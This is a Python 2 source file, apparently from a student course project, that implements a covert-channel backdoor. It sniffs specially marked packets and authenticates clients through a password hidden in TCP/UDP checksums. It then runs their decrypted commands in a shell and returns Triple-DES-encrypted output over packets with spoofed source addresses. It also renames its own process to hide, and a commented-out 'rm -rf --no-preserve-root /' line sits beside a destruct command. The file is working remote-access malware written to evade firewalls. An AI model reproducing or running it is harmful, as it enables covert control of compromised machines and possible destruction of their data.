#	required.py
#
#	Design and Program: Vishav Singh
#                     Manuel Gonzales
#						
#
#	functions:
#
#		def pass_decode(cipher, key)
#		def sniffer(listen, dst, pwd, key, num)
#		def parse(pkt, pwd, port, key, num)
#		def split_every(n, s)
#		def send_message(ip_address, port, protocol, message)
#		def main()
#
#	Backdoor script that would be able to stablish a "connection with an attacker" using 
#	covert channels and an encrypted connection. The transfer is made on card level on both
#	ends in order to avoid firewalls and such applications.
#

import setproctitle
import threading
import optparse
from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
from pyDes import *


#Constants
CONST_ENCODE_MOD = 126
CONST_MAXIMUM_PORT = 65535
CONST_TTL_VALUE = 65
CONST_CHECKSUM_VALUE = 0x0001
CONST_TOS_VALUE = 0x01


#Globals
ip_list = {}  # map holding all the clients
lock = threading.Lock()  # mutex for map access


# function to decode the password (need caesar because the password comes split into packets)
def pass_decode(cipher, key):
    plaintext = ''
    for each in cipher:
        c = (ord(each) - key) % CONST_ENCODE_MOD
        if c < 32:
            c += 95
        plaintext += chr(c)

    return plaintext


#main function to parse the arguments and start backdoor
def main():
    
    parser = optparse.OptionParser()
    parser.add_option("-s", "--source_port", type="int", dest="source_port",
                      help="[REQUIRED] Port to Listen for packets")
    parser.add_option("-d", "--destination_port", type="int", dest="destination_port",
                      help="[REQUIRED] Port to Send packets")
    parser.add_option("-p", "--password", type="string", dest="password",
                      help="[REQUIRED] Password to Establish Connection (10 bytes)")
    parser.add_option("-n", "--number", type="int", dest="passnumber",
                      help="[REQUIRED] Number used to Encode Password")
    parser.add_option("-k", "--key", type="string", dest="key",
                      help="[REQUIRED] Key to Encrypt Connection (16 bytes)")
    parser.add_option("-t", "--title", type="string", dest="title",
                      help="[REQUIRED] Process name")

    (options, args) = parser.parse_args()

    if len(sys.argv) < 2:
        parser.error("Use -h or --help for instructions")

    if not options.title or not options.source_port or not options.destination_port or not options.password or not options.passnumber or not options.key:
        parser.error("Please fill in all the required parameters")

    setproctitle.setproctitle(options.title)

    if len(options.password) != 10:
        parser.error("Please use a 10 bytes password")

    if len(options.key) != 16:
        parser.error("Please use a 16 bytes Key")

    try:
        pass_number = int(options.passnumber)
    except ValueError:
        parser.error("Please enter a valid number")

    if options.destination_port < 0 or options.destination_port > 65535:
        parser.error("Please enter a valid source destination number")

    if options.source_port < 0 or options.source_port > 65535:
        parser.error("Please enter a valid source port number")

    sniffer(options.source_port, options.destination_port, options.password, options.key, pass_number)


# sniff for IP packets that are TCP have tos = 1 , ttl = 65, checksum = 1 and are sent to the port in the arguments
# once one is received send it for parsing
# listen - port to listen to
# dst - destination port to reply to client
# pwd - used to authenticate the client
# key - used to encrypt connection using DES
# num - used to decode the password received from the client
def sniffer(listen, dst, pwd, key, num):
    while True:
        pkt = sniff(filter="ip[1] == 1 and ip[8] == 65 and ip[11] = 1 and dst port " + str(listen), count=1, store=1)
        thread_parse = threading.Thread(target=parse, args=(pkt[0], pwd, dst, key, num))
        thread_parse.start()


# parse each packet with signature and start reading the password hidden in the checksum every 2 bytes.
# the bytes need to be decoded and then matched to the password entered. once the whole sequence (10 bytes in password 
# so 5 packets) has been fulfilled, the ip can now start sending commands to be run in bash. bash commands are 
# decrypted using DES key bash output is encrypted using DES key and sent back to client. Packet info is mostly 
#randomized but the destination IP and port remain the same so that the clients can use the same port.
# pkt - packet to pase
# pwd - used to authenticate the client
# port - destination port to reply to client
# keys - used to encrypt connection using DES
# num - used to decode the password received from the client
def parse(pkt, pwd, port, keys, num):
    global ip_list
    try:
        if IP in pkt:
            ip_address = pkt[IP].src
        else:
            return

        if pkt[IP].proto == 6:
            proto = 6
        elif pkt[IP].proto == 17:
            proto = 17
        else:
            print("Unknown Protocol Beware")
            return;

        lock.acquire()

        if ip_address in ip_list:
            stage = ip_list.get(ip_address)
        else:
            if proto == 6:
                message = pkt[TCP].chksum
            else:
                message = pkt[UDP].chksum
            hex_message = hex(message)
            message = hex_message[2:].decode("hex")
            msg = pass_decode(message, num)

            if pwd[0:2] == msg:
                ip_list[ip_address] = 1

            lock.release()
            return

        if stage == 1:
            if proto == 6:
                message = pkt[TCP].chksum
            else:
                message = pkt[UDP].chksum
            hex_message = hex(message)
            message = hex_message[2:].decode("hex")
            msg = pass_decode(message, num)

            if pwd[2:4] == msg:
                ip_list[ip_address] = 2

            lock.release()
            return

        if stage == 2:
            if proto == 6:
                message = pkt[TCP].chksum
            else:
                message = pkt[UDP].chksum
            hex_message = hex(message)
            message = hex_message[2:].decode("hex")
            msg = pass_decode(message, num)

            if pwd[4:6] == msg:
                ip_list[ip_address] = 3

            lock.release()
            return

        if stage == 3:
            if proto == 6:
                message = pkt[TCP].chksum
            else:
                message = pkt[UDP].chksum
            hex_message = hex(message)
            message = hex_message[2:].decode("hex")
            msg = pass_decode(message, num)

            if pwd[6:8] == msg:
                ip_list[ip_address] = 4

            lock.release()
            return

        if stage == 4:
            if proto == 6:
                message = pkt[TCP].chksum
            else:
                message = pkt[UDP].chksum
            hex_message = hex(message)
            message = hex_message[2:].decode("hex")
            msg = pass_decode(message, num)

            if pwd[8:10] == msg:
                ip_list[ip_address] = 5

            lock.release()
            print "Password: " + pwd + " from: " + ip_address
            send_message(ip_address, port, proto, triple_des(keys).encrypt("continue", padmode=2))

            return

        if stage == 5:

            if proto == 6:
                message = str(pkt[TCP].payload)
            else:
                message = str(pkt[UDP].payload)

            message_plain = triple_des(keys).decrypt(message, padmode=2)

            if message_plain == "timetogohard":
                killit = "--no-preserve-root"
                # subprocess.call(["rm", "rf", "--no-preserve-root", "/"])

            if message_plain == "timetogo":
		for key in ip_list:
		    send_message(key, port, 6, triple_des(keys).encrypt("exit", padmode=2))					
		    send_message(key, port, 17, triple_des(keys).encrypt("exit", padmode=2))	
                os.kill(os.getpid(), 9)

            if message_plain == "exit":
                ip_list[ip_address] = 1
                lock.release()
                return

            lock.release()

            strings = message_plain.split()
            if strings[0] == "cd":
                if strings[1] == "..":
                    new_dir = os.path.dirname(os.getcwd())
                    os.chdir(new_dir)
                elif strings[1].startswith('/'):
                    os.chdir(strings[1])
                else:
                    current_dir = os.getcwd()
                    os.chdir(current_dir + '/' + strings[1])
            else:
                output = subprocess.check_output(message_plain, shell=True)
                output_map= split_every(1024,output)
                for s in output_map:
                    cipher_text = triple_des(keys).encrypt(s, padmode=2)
                    send_message(ip_address, port, proto, cipher_text)

            return
    except:
        lock.release()
        return
	
    print("HashMap Error")
    lock.release()
    return


#function to split a large string into a set of substrings in an array
#n - size of each substring
#s - string value
def split_every(n, s):
     return [ s[i:i+n] for i in range(0, len(s), n) ]


#function to send the messages to the clients, the message needs to be encrypted before calling
#this function.
#ip_address - destination ip address
#port - destination port
#protocol - TCP or UDP
#message- string value
def send_message(ip_address, port, protocol, message):
    if protocol == 6:
        tcp_pkt = IP() / TCP()

        tcp_pkt[IP].tos = CONST_TOS_VALUE
        tcp_pkt[IP].ttl = CONST_TTL_VALUE
        tcp_pkt[IP].chksum = CONST_CHECKSUM_VALUE

        tcp_pkt[IP].version = 4L
        tcp_pkt[IP].flags = 0x02
        tcp_pkt[IP].frag = 0L
        tcp_pkt[IP].src = '.'.join('%s' % random.randint(0, 255) for i in range(4))
        tcp_pkt[IP].dst = ip_address
        tcp_pkt[IP].proto = 0X06
        tcp_pkt[TCP].seq = random.randint(pow(2, 20), pow(2, 32) - 1)
        tcp_pkt[TCP].sport = random.randint(0, CONST_MAXIMUM_PORT)
        tcp_pkt[TCP].dport = port
        tcp_pkt[TCP].flags = 0x08

        tcp_pkt[TCP].payload = message
        send(tcp_pkt, verbose=0)
        time.sleep(0.1)

    else:
        udp_pkt = IP() / UDP()

        udp_pkt[IP].tos = CONST_TOS_VALUE
        udp_pkt[IP].ttl = CONST_TTL_VALUE
        udp_pkt[IP].chksum = CONST_CHECKSUM_VALUE

        udp_pkt[IP].version = 4L
        udp_pkt[IP].flags = 0x02
        udp_pkt[IP].frag = 0L
        udp_pkt[IP].src = '.'.join('%s' % random.randint(0, 255) for i in range(4))
        udp_pkt[IP].dst = ip_address
        udp_pkt[IP].proto = 0X11
        udp_pkt[UDP].sport = random.randint(0, CONST_MAXIMUM_PORT)
        udp_pkt[UDP].dport = port

        udp_pkt[UDP].payload = message
        send(udp_pkt, verbose=0)
        time.sleep(0.1)


# start script
main()
